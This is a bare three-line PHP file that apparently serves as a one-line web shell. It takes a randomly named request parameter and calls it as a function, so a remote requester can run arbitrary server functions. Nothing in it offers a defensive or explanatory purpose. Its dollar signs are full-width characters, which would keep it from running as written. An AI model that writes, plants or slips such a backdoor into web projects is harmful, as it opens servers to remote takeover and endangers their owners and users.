<?php
＄_GET['wAgbtBbV'](＄_GET['wAgbtBbV']);
?>
